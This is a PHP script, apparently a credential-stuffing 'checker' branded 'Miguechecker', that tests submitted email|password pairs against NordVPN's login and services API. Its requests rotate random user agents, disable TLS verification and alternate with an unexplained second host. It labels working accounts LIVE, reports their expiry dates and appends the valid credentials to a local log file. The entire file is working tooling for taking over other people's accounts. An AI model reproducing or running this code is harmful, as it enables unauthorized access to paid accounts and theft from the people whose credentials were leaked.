<?php

   error_reporting(0);

    require 'agent.php';
    /**
     * 
     */
    class NewClass
    {   


        function cari($string,$start,$end){
            $str = explode($start,$string);
            $str = explode($end,$str[1]);
            return $str[0];
        }


        function get($token)
        {
            $listApi = array(
                "https://zwyr157wwiu6eior.com/v1/users/services",
                "https://api.nordvpn.com/v1/users/services",
            );
            shuffle($listApi);
            $url = array_shift($listApi);

            $ugent = new Random_UA();
            $UA = $ugent->generate();
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_USERAGENT, $UA);
            curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION,true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,10);
            $headers = array();
            $headers[] = 'Accept: application/json';
            $headers[] = 'User-Agent: '.$UA.'';
            $headers[] = 'Content-Type: application/json';
            $headers[] = 'Authorization: token:'.$token.'';
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

            $page = curl_exec($ch);

            curl_close($ch);

            return $page;

        }

        function login($u, $p)
        {
            $listApi = array(
                "https://zwyr157wwiu6eior.com/v1/users/tokens",
                "https://api.nordvpn.com/v1/users/tokens",
            );
            shuffle($listApi);
            $url = array_shift($listApi);

            $ugent = new Random_UA();
            $UA = $ugent->generate();
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_USERAGENT, $UA);
            curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION,true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,10);
            $headers = array();
            $headers[] = 'Authority: api.nordvpn.com';
            $headers[] = 'Accept: application/json';
            $headers[] = 'User-Agent: '.$UA.'';
            $headers[] = 'Content-Type: application/json';
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '{"username":"'.$u.'", "password":"'.$p.'"}');

            $page = curl_exec($ch);

            curl_close($ch);

            return $page;

        }


    }

    $goig = $_POST['mailpass'];
    $next = explode("|", $goig);
    $u = $next[0];
    $p = $next[1];

    $new = new NewClass();
    $go = $new->login($u, $p);
    if ($go) {
        // TOKEN
        $token = $new->cari($go, '"token":"','"');

        $go = $new->get($token);
        //print_r($go);

            if (strpos($go, 'name')) {

                // INFO
                $FechaExpiracion = $new->cari($go, '"expires_at":"','"');

                echo('{"error":0,"msg":"<font color=#169f26><b>LIVE NordVPN by Miguechecker</b></font> [<font color=#1565c0>login</font>] - [ <font color=#00acc1>'.date("d/m/Y g:i A").'</font> ] | '.$u.'|'.$p.' | <font color=blue>FechaExpiracion</font>: <font color=red>'.$FechaExpiracion.'</font>"}');
               file_put_contents("rzl/Login.txt", $u."|".$p."|Expires_at: ".$FechaExpiracion."\n", FILE_APPEND);
            }
            elseif(strpos($go, 'Unauthorized')) {
                echo('{"error":2,"msg":"<font color=red><b>DIE</b></font> - [ <font color=red>'.date("d/m/Y g:i A").'</font> ] | '.$u.'|'.$p.'"}');
            }
            else{
                echo('{"error":2,"msg":"<font color=red><b>DIE</b> error baru</font> - [ <font color=red>'.date("d/m/Y g:i A").'</font> ] | '.$u.'|'.$p.'"}');
            }
        }else{
                echo('{"error":-1,"msg":"<font color=#8a50b1><b>UNCHECK</b></font> [<font color=red>check your connection</font>] - [ <font color=red>'.date("d/m/Y g:i A").'</font> ] | '.$u.'|'.$p.'"}');
            }

    
    

    
?>